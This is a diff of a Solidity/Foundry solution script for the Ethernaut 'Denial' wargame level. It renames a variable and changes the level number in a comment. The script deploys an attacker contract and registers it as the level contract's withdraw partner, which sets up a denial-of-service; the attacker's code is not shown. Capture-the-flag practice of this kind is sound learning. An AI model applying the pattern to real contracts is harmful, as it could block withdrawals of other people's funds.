@@ -5,7 +5,7 @@ import "forge-std/Script.sol";
 import "../src/levels/Denial.sol";
 
 /*
-    Solution script for the Ethernaut Level 9: Denial
+    Solution script for the Ethernaut Level 20: Denial
 
     1. Add your priate key to the cast wallet keystore
     2. Replace the instance address used in DenialScript
@@ -37,15 +37,15 @@ contract DenialAttack {
 contract DenialScript is Script {
     // replace instance with your level1 instance adddress
     address payable instance = payable(0x864420E5f34830bA9342C9754bFe31B87a7e9e3c);
-    Denial denial = Denial(instance);
+    Denial level20 = Denial(instance);
 
     function run() external {
         vm.startBroadcast();
 
         DenialAttack attacker = new DenialAttack();
-        denial.setWithdrawPartner(address(attacker));
+        level20.setWithdrawPartner(address(attacker));
 
-        require(denial.partner() == address(attacker), "Partner not set to attacker contract");
+        require(level20.partner() == address(attacker), "Partner not set to attacker contract");
 
         vm.stopBroadcast();
     }
